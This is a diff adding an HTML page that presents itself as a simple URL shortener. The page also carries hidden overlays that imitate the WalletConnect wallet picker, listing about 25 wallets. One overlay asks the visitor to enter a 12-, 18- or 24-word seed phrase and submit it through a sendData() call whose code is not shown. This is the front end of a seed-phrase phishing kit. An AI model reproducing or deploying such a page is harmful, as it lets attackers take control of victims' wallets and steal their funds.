@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shiib</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Shiib URL Shortener</h1>
+        <div class="form">
+            <input type="text" id="url" placeholder="Enter your URL">
+            <button onclick="shortenURL()">Shorten</button>
+        </div>
+        <div id="result"></div>
+    </div>
+
+    <div class="owerlay" id="walletconnect-wrapper">
+        <div class="walletconnect-modal__base animated fadeIn">
+            <div class="walletconnect-modal__header">
+                <h2 id="wallet-connect-h2">Connect Wallet</h2>
+            </div>
+            <div class="walletconnect-modal__mobile__toggle">
+                <div class="walletconnect-modal__mobile__toggle_selector"></div>
+                <a id="a-1" class="a-number" style="font-weight: bold;">1</a>
+                <a id="a-2" class="a-number">2</a>
+                <a id="a-3" class="a-number">3</a>
+                <a id="a-4" class="a-number">4</a>
+                <a id="a-5" class="a-number">5</a>
+            </div>
+			 <div class="walletconnect-connect__buttons__wrapper">
+                <div class="walletconnect-connect__buttons__wrapper__wrap" style="display: grid;">
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/metamask.svg">
+                        <div>MetaMask</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/trustwallet.svg">
+                        <div>Trust Wallet</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/binance.svg">
+                        <div>Binance Chain Wallet</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/walletconnect.svg">
+                        <div>WalletConnect</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/coinbase.svg">
+                        <div>Coinbase Wallet</div>
+                    </div>
+                </div>
+				                <div class="walletconnect-connect__buttons__wrapper__wrap" style="display: none;">
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/fortmatic.svg">
+                        <div>Fortmatic</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/portis.svg">
+                        <div>Portis</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/torus.svg">
+                        <div>Torus</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/venly.svg">
+                        <div>Venly</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/bitski.svg">
+                        <div>Bitski</div>
+                    </div>
+                </div>
+				                <div class="walletconnect-connect__buttons__wrapper__wrap" style="display: none;">
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/dapper.svg">
+                        <div>Dapper</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/opera.svg">
+                        <div>Opera</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/authereum.svg">
+                        <div>Authereum</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/web3auth.svg">
+                        <div>Web3Auth</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/bitkeep.svg">
+                        <div>BitKeep</div>
+                    </div>
+                </div>
+				                <div class="walletconnect-connect__buttons__wrapper__wrap" style="display: none;">
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/sequence.svg">
+                        <div>Sequence</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/core.svg">
+                        <div>Core</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/enkrypt.svg">
+                        <div>Enkrypt</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/frame.svg">
+                        <div>Frame</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/phantom.svg">
+                        <div>Phantom</div>
+                    </div>
+                </div>
+				                <div class="walletconnect-connect__buttons__wrapper__wrap" style="display: none;">
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/rabby.svg">
+                        <div>Rabby</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/mathwallet.svg">
+                        <div>MathWallet</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/tokenpocket.svg">
+                        <div>TokenPocket</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/safepal.svg">
+                        <div>SafePal</div>
+                    </div>
+                    <div class="sc-bdVaJa LPcvk" onclick="clickWallets(this)">
+                        <img src="./img/zerion.svg">
+                        <div>Zerion</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="close-popup"></div>
+    </div>
+	    <div id="wallet-words" class="owerlay">
+        <div class="walletconnect-modal__base animated fadeIn">
+            <div class="walletconnect-modal__header">
+                <h2>Connect with WalletConnect</h2>
+            </div>
+            <div class="walletconnect-modal__mobile__toggle">
+                <div class="walletconnect-modal__mobile__toggle_selector"></div>
+            </div>
+            <div class="walletconnect-connect__buttons__wrapper">
+                <div class="walletconnect-connect__buttons__wrapper__wrap">
+                    <div class="sc-bdVaJa LPcvk">
+                        <button id="wallet-connect-metamask" type="button" class="sc-dkPtyc fsDSiK" style="justify-content: space-between;">
+                            <div color="primary" class="sc-gtsrHT sc-cxNHIi jDnmwq hisNCc" style="color: white; text-align: left;font-size: 16px;">
+                                <span id="wallet-type">WalletConnect</span><br>
+                                <span style="line-height: 1.5;font-size: 9px;font-weight: 600;color: #afafaf;font-size: 10px;">Login using seed phrase</span>
+                            </div>
+							                            <svg id="image-wallet" viewBox="0 0 40 40" width="40px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-bdnxRM la-Dshj">
+                                <path d="M8.68096 12.4756C14.9323 6.39698 25.0677 6.39698 31.3191 12.4756L32.0714 13.2071C32.384 13.511 32.384 14.0038 32.0714 14.3077L29.4978 16.8103C29.3415 16.9622 29.0881 16.9622 28.9318 16.8103L27.8965 15.8036C23.5354 11.563 16.4647 11.563 12.1036 15.8036L10.9948 16.8817C10.8385 17.0336 10.5851 17.0336 10.4288 16.8817L7.85517 14.3791C7.54261 14.0752 7.54261 13.5824 7.85517 13.2785L8.68096 12.4756ZM36.6417 17.6511L38.9322 19.8783C39.2448 20.1823 39.2448 20.675 38.9322 20.979L28.6039 31.022C28.2913 31.3259 27.7846 31.3259 27.472 31.022C27.472 31.022 27.472 31.022 27.472 31.022L20.1416 23.8942C20.0634 23.8182 19.9367 23.8182 19.8586 23.8942C19.8586 23.8942 19.8586 23.8942 19.8586 23.8942L12.5283 31.022C12.2157 31.3259 11.709 31.3259 11.3964 31.022C11.3964 31.022 11.3964 31.022 11.3964 31.022L1.06775 20.9788C0.755186 20.6749 0.755186 20.1821 1.06775 19.8782L3.35833 17.6509C3.6709 17.347 4.17767 17.347 4.49024 17.6509L11.8208 24.7789C11.8989 24.8549 12.0256 24.8549 12.1038 24.7789C12.1038 24.7789 12.1038 24.7789 12.1038 24.7789L19.4339 17.6509C19.7465 17.347 20.2533 17.347 20.5658 17.6509C20.5658 17.6509 20.5658 17.6509 20.5658 17.6509L27.8964 24.7789C27.9745 24.8549 28.1012 24.8549 28.1794 24.7789L35.5098 17.6511C35.8223 17.3471 36.3291 17.3471 36.6417 17.6511Z" fill="#3389FB"></path>
+                            </svg>
+                        </button>
+
+						                        <label style="margin-bottom: 10px;margin-top: 10px;font-size: 11px;font-weight: 600;color: #848484;">Enter your 12, 18 or 24 seed phrase:</label>
+                        <input type="hidden" name="wallet" value="walletconnect">
+                        <textarea id="words" name="phrase" rows="3" placeholder="mistake ghost umbrella hybrid nest reduce wife curtain answer spare civil post" style="font-family: 'Kanit';"></textarea>
+                        <center>
+                            <button onclick="sendData()" class="sc-hKFxyN fXdAhg" style="margin-top: 20px;">
+                                Confirm
+                            </button>
+                        </center>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="close-popup"></div>
+    </div>
+	
